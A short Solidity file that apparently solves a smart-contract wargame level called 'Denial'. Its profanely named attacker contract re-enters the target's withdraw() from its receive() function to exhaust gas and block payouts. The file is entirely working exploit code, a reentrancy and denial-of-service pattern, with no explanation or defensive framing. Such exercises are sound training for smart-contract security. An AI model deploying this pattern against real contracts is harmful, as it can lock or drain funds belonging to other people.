// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract DenialInterface {
    function withdraw() external {}
}

contract FuckDenial {
    DenialInterface denialInterface;

    constructor(address _address) {
        denialInterface = DenialInterface(_address);
    }

    receive() external payable {
        denialInterface.withdraw();
    }
}
